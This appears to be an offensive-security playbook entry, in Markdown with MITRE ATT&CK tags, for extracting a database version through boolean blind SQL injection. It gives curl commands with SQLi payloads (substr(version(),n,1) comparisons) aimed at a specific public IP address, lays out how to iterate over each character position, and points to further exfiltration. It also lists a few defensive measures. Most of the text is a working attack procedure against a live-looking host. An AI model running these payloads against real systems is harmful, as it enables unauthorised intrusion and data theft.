---
tags:
  - sqli-exfiltration
  - database-enum
  - blind-extraction
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/curl-version-extract-pos1]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:20.360Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 8de30e78-31f0-40db-80ce-9ddd2ed17b65
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Extract-Database-Version-via-Boolean-SQLi

## Summary

This procedure uses Boolean Blind SQL Injection to extract the database version character-by-character from the /item/ endpoint URI path, leveraging SUBSTR and response codes to infer each digit/character.

## Description

Building on confirmed injection, payloads like /item/default'and substr(version(),1,1)='2'-- are tested iteratively for positions 1 through 8. True conditions (200 OK) reveal characters; functions like SUBSTR, LENGTH, UPPER are compatible. This extracted '20.9.2.2' and opens paths to broader exfiltration or modification.

## Requirements

1. Confirmed injection from prior tests
2. Burp Suite for payload iteration
3. Script or manual testing for character guessing (0-9, a-z)

## Defense

Defensive measures and detection strategies:

- Disable version() exposure in queries
- Implement input validation and escaping for paths
- Anomaly detection on high-volume similar requests

## Objectives

1. Reconstruct database version string
2. Validate exfiltration feasibility
3. Assess potential for further SQL abuse

## Instructions

### Step 1: Extract First Character of Version

**Context**: Test position 1 against possible values until true response confirms '2'.

**Command** ([[commands/curl-version-extract-pos1]]):
```bash
curl -i "http://51.83.253.82/item/default'and substr(version(),1,1)='2'--"
```

> Expected: 200 OK for correct guess. Repeat for '0' at position 2, etc., to build '20.9.2.2'.

### Step 2: Iterate for Remaining Characters

**Context**: Systematically test each position (2-8) with payloads, noting 200 OK for matches.

**Command** (similar to above, adjust position and char):
```bash
curl -i "http://51.83.253.82/item/default'and substr(version(),2,1)='0'--"
```

> Manually or script iterations; test functions like char_length for length confirmation.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-version-extract-pos1]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[sqli-exfiltration]]
- [[database-enum]]
